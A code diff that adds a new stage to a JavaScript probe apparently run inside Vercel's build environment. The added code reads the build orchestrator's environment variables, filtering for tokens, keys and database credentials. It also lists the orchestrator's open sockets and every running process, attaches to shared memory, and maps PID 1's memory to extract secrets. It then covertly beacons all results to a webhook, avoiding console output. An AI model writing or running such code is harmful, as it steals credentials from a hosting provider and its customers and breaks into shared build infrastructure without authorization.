@@ -25071,5 +25071,250 @@ print('PTRACE_DETACHED')
 
 // v170 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v170" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v170";
+
+// ==================== v171 ====================
+
+// v171-1: PID 1 file descriptor enumeration — what is the orchestrator holding open?
+// /proc/1/fd/ lists all file descriptors open by PID 1 as symlinks.
+// This reveals: network sockets to Vercel APIs, open build artifact files,
+// log files, and any pipes between orchestrator and child processes.
+// The fdinfo files show socket state, flags, and positions.
+report.pid1FdEnum = safe(() => {
+  const fdList = safe(() => execSync('ls -la /proc/1/fd/ 2>/dev/null | head -50 || echo "CANT_LIST_PID1_FD"', { timeout: 5000 }).toString().trim());
+  // Resolve symlinks to see what each fd points to
+  const fdTargets = safe(() => execSync(
+    'for f in /proc/1/fd/*; do target=$(readlink "$f" 2>/dev/null); [ -n "$target" ] && echo "FD$(basename $f): $target"; done 2>/dev/null | head -30 || echo "NO_FD_TARGETS"',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Count by type
+  const fdByType = safe(() => execSync(
+    'ls -la /proc/1/fd/ 2>/dev/null | grep -v "^total" | awk \'{print $NF}\' | grep -oP "(socket|pipe|anon_inode|/[^\\[]+)" | sort | uniq -c | sort -rn | head -20 || echo "NO_TYPE_COUNT"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Socket fds — map them to actual connections
+  const socketFds = safe(() => execSync(
+    `python3 -c "
+import os, re
+
+fd_dir = '/proc/1/fd'
+try:
+    fds = os.listdir(fd_dir)
+except:
+    print('CANT_LIST_FDS')
+    exit()
+
+socket_inodes = []
+for fd in fds:
+    try:
+        target = os.readlink(f'{fd_dir}/{fd}')
+        m = re.match(r'socket:\\[(\d+)\\]', target)
+        if m:
+            socket_inodes.append(int(m.group(1)))
+    except:
+        pass
+
+print(f'PID1_SOCKET_COUNT: {len(socket_inodes)}')
+
+# Map inodes to TCP connections
+with open('/proc/net/tcp') as f:
+    tcp_lines = f.readlines()[1:]
+with open('/proc/net/tcp6') as f:
+    tcp6_lines = f.readlines()[1:]
+
+import socket, struct
+def hex_ip(h):
+    return socket.inet_ntoa(bytes.fromhex(h)[::-1])
+
+for line in tcp_lines + tcp6_lines:
+    parts = line.split()
+    if len(parts) < 10: continue
+    inode = int(parts[9])
+    if inode in socket_inodes:
+        try:
+            local = f'{hex_ip(parts[1][:8])}:{int(parts[1][9:], 16)}'
+            remote = f'{hex_ip(parts[2][:8])}:{int(parts[2][9:], 16)}'
+            print(f'PID1_CONN: {local} -> {remote} state={parts[3]}')
+        except:
+            pass
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { fdList: fdList.substring(0, 2000), fdTargets, fdByType, socketFds };
+});
+
+// v171-2: PID 1 environment variables — orchestrator secrets
+// /proc/1/environ contains the NULL-separated environment of PID 1.
+// This is one of the most valuable targets: Vercel likely passes API keys,
+// database credentials, build tokens, and service URLs as environment variables
+// to the build orchestrator process.
+report.pid1Environ = safe(() => {
+  const environRaw = safe(() => {
+    const data = readFileSync('/proc/1/environ');
+    return data.toString('utf8').replace(/\0/g, '\n').trim();
+  });
+  // Parse key=value pairs and redact non-vercel secrets (but flag patterns)
+  const environParsed = safe(() => {
+    if (!environRaw) return 'EMPTY';
+    const lines = environRaw.split('\n').filter(l => l.includes('='));
+    const interesting = lines.filter(l => {
+      const key = l.split('=')[0].toUpperCase();
+      return key.match(/TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|AUTH|VERCEL|ARTIFACTS|OIDC|CACHE|RUNTIME|AWS|GCP|AZURE|DATABASE|REDIS|MONGO|PG|MYSQL/);
+    });
+    return { total: lines.length, interesting: interesting.length, keys: lines.map(l => l.split('=')[0]) };
+  });
+  return { environRaw: environRaw ? environRaw.substring(0, 5000) : 'UNREADABLE', environParsed };
+});
+
+// v171-3: Full process cmdline enumeration — all running processes
+// /proc/*/cmdline contains the command line of every process. Reading all of
+// them reveals the complete process tree: orchestrator, build workers, monitoring
+// agents, and any credential-management processes.
+report.allProcessCmdlines = safe(() => {
+  const procList = safe(() => execSync(
+    `python3 -c "
+import os, re
+
+pids = [p for p in os.listdir('/proc') if p.isdigit()]
+procs = []
+for pid in pids:
+    try:
+        with open(f'/proc/{pid}/cmdline', 'rb') as f:
+            cmd = f.read().replace(b'\\x00', b' ').decode(errors='replace').strip()
+        with open(f'/proc/{pid}/status') as f:
+            status = {l.split(':')[0]: l.split(':')[1].strip() for l in f.readlines() if ':' in l}
+        name = status.get('Name', '?')
+        uid = status.get('Uid', '?').split()[0]
+        procs.append(f'PID={pid} UID={uid} NAME={name} CMD={cmd[:100]}')
+    except:
+        pass
+
+procs.sort(key=lambda x: int(x.split('=')[1].split()[0]))
+print(f'TOTAL_PROCS: {len(procs)}')
+for p in procs:
+    print(p)
+" 2>&1`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { procList };
+});
+
+// v171-4: SysV IPC enumeration — shared memory, semaphores, message queues
+// System V IPC provides inter-process communication primitives.
+// If the build orchestrator uses SysV shared memory to share data with
+// child processes, we can attach to it and read (or write) that memory.
+report.sysVIpc = safe(() => {
+  const shmInfo = safe(() => readFileSync('/proc/sysvipc/shm', 'utf8').trim());
+  const semInfo = safe(() => readFileSync('/proc/sysvipc/sem', 'utf8').trim());
+  const msgInfo = safe(() => readFileSync('/proc/sysvipc/msg', 'utf8').trim());
+  // Also check ipcs command
+  const ipcsOutput = safe(() => execSync('ipcs 2>/dev/null || echo "NO_IPCS"', { timeout: 3000 }).toString().trim());
+  // Try to attach to any existing shared memory segment
+  const shmAttach = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct
+
+libc = ctypes.CDLL('libc.so.6')
+
+# SysV SHM
+IPC_STAT = 2
+SHM_STAT = 13
+SHM_STAT_ANY = 15
+
+# Get shared memory IDs
+SHM_INFO = 14
+class shminfo(ctypes.Structure):
+    _fields_ = [('shmmax',ctypes.c_ulong),('shmmin',ctypes.c_ulong),
+                ('shmmni',ctypes.c_ulong),('shmseg',ctypes.c_ulong),
+                ('shmall',ctypes.c_ulong)]
+
+info = shminfo()
+max_idx = libc.shmctl(0, SHM_INFO, ctypes.addressof(info))
+print(f'SHM_MAX_IDX: {max_idx}')
+
+# Enumerate all shared memory segments
+for idx in range(max_idx + 1):
+    class shmid_ds(ctypes.Structure):
+        _fields_ = [
+            ('shm_perm', ctypes.c_ulonglong * 8),  # ipc_perm
+            ('shm_segsz', ctypes.c_size_t),
+            ('shm_atime', ctypes.c_long),
+            ('shm_dtime', ctypes.c_long),
+            ('shm_ctime', ctypes.c_long),
+            ('shm_cpid', ctypes.c_int),
+            ('shm_lpid', ctypes.c_int),
+            ('shm_nattch', ctypes.c_ulong),
+        ]
+    ds = shmid_ds()
+    shmid = libc.shmctl(idx, SHM_STAT_ANY, ctypes.addressof(ds))
+    if shmid >= 0:
+        size = ds.shm_segsz
+        print(f'SHM_SEGMENT: id={shmid} idx={idx} size={size} nattach={ds.shm_nattch}')
+        if size > 0 and size < 10*1024*1024:  # <10MB
+            # Attach and read first 64 bytes
+            addr = libc.shmat(shmid, 0, 0o10000)  # SHM_RDONLY=0o10000
+            if addr != ctypes.c_ulong(-1).value:
+                buf = (ctypes.c_char * min(64, size)).from_address(addr)
+                print(f'SHM_CONTENT: {bytes(buf).hex()[:64]}')
+                libc.shmdt(addr)
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { shmInfo, semInfo, msgInfo, ipcsOutput, shmAttach };
+});
+
+// v171-5: /proc/1/maps full memory layout analysis
+// The full memory map of PID 1 shows: text/code sections, heap, stack,
+// loaded libraries, and memory-mapped files. By reading specific regions,
+// we can extract in-memory secrets or reverse-engineer the orchestrator binary.
+report.pid1MemoryMap = safe(() => {
+  const pid1Maps = safe(() => readFileSync('/proc/1/maps', 'utf8').trim());
+  // Identify the main executable
+  const mainExe = safe(() => execSync('readlink /proc/1/exe 2>/dev/null || echo "CANT_READ_EXE"', { timeout: 2000 }).toString().trim());
+  // Count mapping types
+  const mapSummary = safe(() => execSync(
+    `python3 -c "
+with open('/proc/1/maps') as f:
+    maps = f.readlines()
+
+total = len(maps)
+rw_count = sum(1 for m in maps if ' rw' in m)
+rx_count = sum(1 for m in maps if ' r-x' in m or ' rwx' in m)
+heap_size = 0
+stack_size = 0
+
+for m in maps:
+    parts = m.split()
+    if len(parts) < 5: continue
+    addrs = parts[0].split('-')
+    size = int(addrs[1], 16) - int(addrs[0], 16)
+    if '[heap]' in m:
+        heap_size += size
+    elif '[stack]' in m:
+        stack_size += size
+
+print(f'TOTAL_MAPS: {total}')
+print(f'RW_MAPPINGS: {rw_count}')
+print(f'RX_MAPPINGS: {rx_count}')
+print(f'HEAP_SIZE: {heap_size // 1024}KB')
+print(f'STACK_SIZE: {stack_size // 1024}KB')
+
+# Libraries loaded
+libs = set()
+for m in maps:
+    parts = m.split()
+    if len(parts) >= 6:
+        path = parts[5]
+        if path.startswith('/') and '.so' in path:
+            libs.add(path.split('/')[-1])
+
+print(f'LOADED_LIBS: {sorted(libs)[:20]}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { pid1Maps: pid1Maps.substring(0, 5000), mainExe, mapSummary };
+});
+
+// v171 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v171" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v171";
 // Intentionally no console.log — all data goes via webhook only
